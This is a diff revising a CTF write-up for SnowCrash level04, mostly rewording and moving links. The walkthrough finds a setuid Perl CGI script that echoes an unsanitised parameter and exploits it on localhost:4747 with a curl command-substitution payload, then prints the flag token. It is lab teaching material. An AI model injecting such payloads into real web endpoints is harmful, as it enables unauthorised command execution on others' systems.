@@ -2,7 +2,7 @@
 
 ## Walkthrough
 
-First, let's check the content of the home directory.
+We check the content of the home directory.
 
 ```bash
 level04@SnowCrash:~$ ls -la
@@ -16,7 +16,7 @@ d--x--x--x  1 root    users    340 Aug 30  2015 ..
 level04@SnowCrash:~$ file level04.pl 
 level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable
 ```
-It looks like the file `level04.pl` is a [Perl](https://en.wikipedia.org/wiki/Perl) script, and as in the last level, the `s` on `level04` permissions indicates the [setuid bit](https://en.wikipedia.org/wiki/Setuid).
+It looks like the file `level04.pl` is a **Perl** script, and as in the last level, the `s` on `level04` permissions indicates the **setuid bit**.
 
 ```perl
 #!/usr/bin/perl
@@ -30,9 +30,9 @@ sub x {
 x(param("x"));
 ```
 
-By analyzing the script, we can quickly understand that it defines a subroutine which receives a parameter and pass it with the `echo` command right after.  
-It imports the [CGI](https://en.wikipedia.org/wiki/Common_Gateway_Interface) interface to process HTTP requests, and gets the query parameter `x` which is then passed to the subroutine.
-The line `# localhost:4747` could also be a hint: maybe this script is already running on our machine? Let's check that.
+We analyze the script, and quickly understand that it defines a subroutine which receives a parameter and pass it with the `echo` command right after.  
+It imports the **CGI** interface to process HTTP requests, and gets the query parameter `x` which is then passed to the subroutine.
+The line `# localhost:4747` could also be a hint: the script is probably running on our machine.
 
 ```bash
 level04@SnowCrash:~$ netstat -tulpn | grep LISTEN
@@ -45,10 +45,15 @@ tcp6       0      0 :::80                   :::*                    LISTEN      
 tcp6       0      0 :::4242                 :::*                    LISTEN      - 
 ```
 
-That's correct.  
-With all the collected information, we can get the current flag by sending a HTTP request to `localhost` on port `4747` with the param `x` set to a command substitution (in our case `getflag`) to run the command during the execution of the Perl script.
+The `netstat` command confirms that a process is running on port **4747**.  
+With all the collected information, we can get the current flag by sending a HTTP request to **localhost** on port **4747**, with the param `x` set to a command substitution (in our case `getflag`), to run the command during the execution of the Perl script.
 
 ```bash
 level04@SnowCrash:~$ curl localhost:4747?x='$(getflag)'
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 ```
+
+## Resources
+
+- [Perl](https://en.wikipedia.org/wiki/Perl)
+- [CGI](https://en.wikipedia.org/wiki/Common_Gateway_Interface)
